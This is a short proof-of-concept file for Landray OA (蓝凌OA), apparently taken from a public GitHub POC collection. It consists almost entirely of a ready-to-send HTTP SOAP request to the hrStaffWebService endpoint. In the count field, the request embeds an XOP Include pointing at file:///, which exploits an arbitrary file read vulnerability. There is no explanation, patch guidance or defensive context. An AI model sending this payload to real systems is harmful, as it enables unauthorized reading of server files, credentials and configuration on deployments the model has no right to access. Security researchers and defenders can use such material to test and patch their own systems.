# landray_hrStaffWebService_fileread

product: 蓝凌OA

```
POST /sys/webservice/hrStaffWebService HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36
Content-Length: 563
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: en-US;q=0.9,en;q=0.8
Cache-Control: max-age=0
Connection: close
Content-Type: multipart/related; boundary=----frhpvivnctknnkiwugaq
SOAPAction: ""

------frhpvivnctknnkiwugaq
Content-Disposition: form-data; name="1"

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://webservice.staff.hr.kmss.landray.com/">
<soapenv:Header/>
<soapenv:Body>
    <web:getHrStaffElements>
        <arg0>
            <beginTimeStamp>1</beginTimeStamp>
            <count><xop:Include 
xmlns:xop="http://www.w3.org/2004/08/xop/include" 
href="file:///"/></count>
        </arg0>
    </web:getHrStaffElements>
</soapenv:Body>
</soapenv:Envelope>
------frhpvivnctknnkiwugaq--
```

from: https://github.com/wy876/POC/blob/main/%E8%93%9D%E5%87%8COA/%E8%93%9D%E5%87%8COA-EKP%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3hrStaffWebService%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
